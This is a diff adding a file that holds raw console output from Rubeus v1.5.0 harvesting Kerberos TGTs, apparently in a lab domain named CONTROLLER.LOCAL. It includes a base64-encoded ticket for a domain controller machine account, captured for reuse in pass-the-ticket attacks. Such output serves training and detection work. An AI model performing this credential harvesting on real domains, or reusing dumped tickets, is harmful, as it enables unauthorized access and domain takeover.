@@ -1,0 +1,42 @@
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[*] Action: TGT Harvesting (with auto-renewal)
+[*] Monitoring every 30 seconds for new TGTs
+[*] Displaying the working TGT cache every 30 seconds
+
+
+[*] Refreshing TGT ticket cache (11/10/2021 4:51:50 AM)
+
+  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL
+  StartTime             :  11/10/2021 3:31:03 AM
+  EndTime               :  11/10/2021 1:31:03 PM
+  RenewTill             :  11/17/2021 3:31:03 AM
+  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  Base64EncodedTicket   :
+
+    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
+    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEnMFNzrTy4CGahkmusnmdrvACKmmbM3yWRXZ
+    LidWhzNq3zZ9bMB/4qETnZ4tCyrkNUslBPoFVSV0WcgDjx2ErbZQPqgyfzRlyk6R66BBHspAm1C5orXx+z2nXbjISG6bXj/1heux
+    waoepeVU+vIfQSprO0J6SBZlA8/iuER9TvDyuSZWxt0joo/KnPDBlZA8yoz17MGngo4z7yyh8lpc45MZId4f0vkvgOAQqxqCp6V3
+    rfk2iIQsTyjZmbts6YKQ0YiNARlFb7IW706F2oDQSKVG0CUY1isbZbtlyLjy6umnQt6j2bVzvdTQwE5RP6LZBeDZJFhrbO65fNQA
+    UDAmEjMDzblQkHHeXWLFCC2c5xMyXPuWVZC+UbtPsV1WyzFQtwA2XuZqXN2KgMEF5NZSMSqc2piePPzkvZbpzhjWaFfdeFnOej6e
+    igrawgOEzFrgJHWniStbHpHXZ2FIU0l1hGb5vx67p4/XxEJCLvUxOgMDAZi1Olwu2cOUR3q4zrpO0esrfpEO84d1gnzeW5iHeq9z
+    KzjX3qVPb35QsK+oLEDGHHb0SBW0upLNAIPp1fVwbZmRlpPfaB3WknXBrLW314Cg8Wm9rEHKUX987etl/+w4wIkUE1kN8B5MM5ih
+    EloO5Ak7FBqM103joiJ47HBzsKyAwd5eUK/Ammizk+jIPFgGLpaZ50vwkd/aIeLaq+dZ7GuPijlwKZCEEU/KWsQyDWX5kaxRom5N
+    D37nrk+TSo+V3qMxvCwFUSkRqPqN2mmYeM/bTXVah7s/rBAVOSdcqEE9cM5CIRSZ+TIFCt1cwEY2KIcBLy/3XfoUGN1B+YLhz06e
+    MBEKtdYBDGEpPRFzWZaFaI8evLEfPzQNQOOArpv9zLi5S0jLeWJLGByOIINixSU1YeI6Vnx5cGdQ7iLl7mAHSVkV2jdH/5A+1LN8
+    smRZtJ1hk08pzDYJvd46Af8oue1GqAWJf+qawMWtr/2C1InZgIeNMqzv8B7ygCloYRQ8WutCtRNDgpuAmoj7AUwtA5FzgMoped9t
+    vAi7guMuVqMG/70HUsQ/e65uHXjrr2KL+pvVX7RO6ewn8fdo889KKkzLqNFJdyR73ZoHghtQulZMJBYc5GsubDFyGfS3XRcQ8vIm
+    IRT7aRUpRPpSK0TnRoH5oRW5NeT7gr7sw7GnR8kF6EwolyC8frg7N+VJSVJbze/pxZIGHrMCw+3ZMRazf/41KCWE87bTgKtlzBp0
+    vB8pprW6J18r0p7LcWA1CROF2GbV9nYd+KeQevYNIgbZ1ryp4leMRKgCe+5/a8a2qbikGnBPv+JEAGETpUrrsef6jmlg5Pc/MQQG
+    4gvbY5tkuaud6LoIeO+DE/tw8OWdExldJ7fJ8tHuMvuHP8VfolXC6W2jgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr
+    MCmgAwIBEqEiBCBD8aKniWOIKBKJRey1e4aRbyryptJyr+kDIVEp5iyP26ESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw
+    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDIxMTExMDExMzEwM1qmERgPMjAyMTExMTAyMTMxMDNapxEYDzIwMjExMTE3
+    MTEzMTAzWqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM
